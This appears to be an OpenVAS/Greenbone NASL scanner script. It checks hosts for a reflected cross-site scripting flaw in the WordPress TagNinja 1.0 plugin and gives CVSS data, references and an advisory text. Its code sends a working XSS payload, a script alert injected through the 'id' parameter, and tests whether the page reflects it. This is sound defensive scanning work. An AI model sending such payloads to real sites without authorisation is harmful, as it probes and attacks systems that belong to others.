CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801850" );
	script_version( "$Revision: 11997 $" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)" );
	script_bugtraq_id( 46090 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress TagNinja Plugin 'id' Parameter Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/43132" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/98049/WordPressTagNinja1.0-xss.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  code in the context of an application." );
	script_tag( name: "affected", value: "WordPress TagNinja Plugin version 1.0" );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input
  passed via the 'id' parameter to wp-content/plugins/tagninja/fb_get_profile.php,
  that allows attackers to execute arbitrary HTML and script code on the web server." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WordPress and is prone to cross site
  scripting vulnerability." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-content/plugins/tagninja/fb_get_profile.php?id=\"><script>" + "alert(document.location)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.location\\)</script>" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

